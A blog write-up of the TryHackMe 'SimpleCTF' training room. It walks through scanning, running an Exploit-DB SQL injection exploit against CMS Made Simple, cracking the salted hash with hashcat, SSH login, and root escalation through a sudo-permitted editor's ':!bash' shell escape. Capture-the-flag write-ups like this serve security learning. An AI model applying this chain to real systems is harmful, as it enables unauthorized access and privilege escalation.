Welcome back to [TryHackMe](https://tryhackme.com/), this time itâ€™s [SimpleCTF](https://tryhackme.com/room/easyctf)â€¦ or as Iâ€™d call it â€˜Not So SimpleCTFâ€™â€¦ as I had a few issues getting this CTF to work.

Letâ€™s dive into it.

## Hints

- How many services are running under port 1000? `nmap`
- What is running on the higher port? Check the `nmap` scan results.
- Whatâ€™s the CVE youâ€™re using against the application? `CVE-****-****` donâ€™t forget to include `CVE-` at the beginning.
- To what kind of vulnerability is the application vulnerable? `***i` something injectionâ€¦?
- Whatâ€™s the password? `hashcat <hash> <wordlist>.txt`
- Where can you log in with the details obtained? Check your `nmap` results again.
- Whatâ€™s the user flag? `ls` and `cat` what you find.
- Is there any other user in the home directory? Whatâ€™s its name? `cat /home/`
- What can you leverage to spawn a privileged shell? Check what can be run with `sudo -*`.
- Whatâ€™s the root flag? `cat /root/root.txt`

## Steps

1. Enumeration as always, start with `nmap -vv -A <ip>`. With ports 21, 80, and 2222 open, we can see what we can find logging into ftp via anonymous via `ftp <ip>`. I didnâ€™t find anything but checking out other writeups, it looks like my THM VM didnâ€™t work as intended.
2. More enumeration, since we have a website, letâ€™s navigate to `http://<ip>` and see what we can find. After manually searching, not a lot there, letâ€™s use `dirsearch -u http://<ip>` to find `/simple/` directory. Navigating to `http://<ip>/simple`, we can find a system called â€˜CMS Made Simpleâ€™ or CMSMS for short. Find the exploit using `locate 'php/webapps/*****.py'`, then make a copy using `cp /usr/share/exploitdb/exploits/php/webapps/*****.py .`
3. Getting the exploit working, now, this took a bit of time and this makes me call it â€˜Not So SimpleCTFâ€™â€¦ the correct CVE exploit is written in Python 2 with missing modules that are working in Python3. To fix this, run `sudo apt install 2to3`, then `2to3 *****.py`, this will convert the exploit from Python 2 to Python 3.
4. Using the exploit by running `python *****.py -u http://<ip>/simple`, note this took me twice to get the correct results. I tried a third time and the resulted varied, so you are warned, try a few times to make sure you get consistent results. ![https://p146.p4.n0.cdn.getcloudapp.com/items/kpu8428g/d56f6ace-eb3e-43e5-a402-490dbc1ff3bb.jpeg?v=c6572056b97da622ef551af4c6e6eae2](https://p146.p4.n0.cdn.getcloudapp.com/items/kpu8428g/d56f6ace-eb3e-43e5-a402-490dbc1ff3bb.jpeg?v=c6572056b97da622ef551af4c6e6eae2)
5. Crack the password, use `hashcat -O -a 0 -m 20 '<salt>:<hash>' <wordlist>.txt --show`. To explain, `-m 20` sets `hashcat` to `md5` with `salt:hash` which is perfect from the exploit we ran.
6. Access via `ssh`, run `ssh mitch@10.10.44.147 -p 2222`, donâ€™t forget to specify the port number from the earlier `nmap` scan.
7. Lastly, escalate privileges, now like other steps, this isnâ€™t so simple either, but do your best to not cheat and search around. Iâ€™ll give you a hint, you can use a certain text editor as `sudo` which can spawn a bash shell with `:!bash`.

## Reflection

This was a fun CTF from [MrSeth6797](https://tryhackme.com/p/MrSeth6797) ([Twitter](https://twitter.com/0xSeth), [Website](https://floreaiulianpfa.com/), [Writeup](https://floreaiulianpfa.com/simple-ctf/)), I would recommend this to any fellow hacking beginner. I think the basics are always important, this reinforced the importance of searching for known vulns and exploits. And also how exploits can be a bit finicky, like needing to convert the exploit from Python 2 to 3.

I use to get a bit annoyed by rooms like this, where it wasnâ€™t clear with things like this. But after a bit more learning, this is how technology is. Things change, the creator of that exploit wrote it in Python 2, I assume at the time Python 3 wasnâ€™t around. So fast forward to now, our Linux systems have both Python 2 and 3, but modules might only work with 3, not 2.

So yeah, all these sorts of issues become less frustrating the more I learn, and it just becomes a part of the process. Iâ€™m also leaning into writeups and the THM Discord more and more. Iâ€™ve spent too long banging my head against the wall and going off track. Itâ€™s all a part of learning, but writeups can be used in a way that you donâ€™t need to see all the answers, scrolling is a thing.

SimpleCTF is a good, solid CTF from THM, like I said, not so Simple, but in the end, itâ€™s worthwhile.

[ðŸ”— CVE](https://www.exploit-db.com/exploits/46635)

Using CVE:

- Ran `sudo apt install 2to3` â€“ exploit written in `python2` has missing modules.
- `2to3 *****.py`, `python *****.py -u http://<ip>/simple` Note, tried multiple times and then randomly workedâ€¦ didnâ€™t change anything, ghost in shell moment.
- Also, took two attempts to get correct salt and hash, third attempt again produced different set.

```
<pre class="wp-block-code">```
[+] Salt for password found: *****
[+] Username found: *****
[+] Email found: *****
[+] Password found: *****

```
```

Crack Password: `hashcat -O -a 0 -m 20 '<salt>:<hash>' <wordlist>.txt --show`

- Note, salt first, then hashed password, used hint for wordlist.

Connect: `ssh *****@<ip> -p 2222`

PrivEsc: `sudo -*`

```
<pre class="wp-block-code">```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/*******

Escalate shell: `sudo ***`, `:!bash`, `cat /root/root.txt`
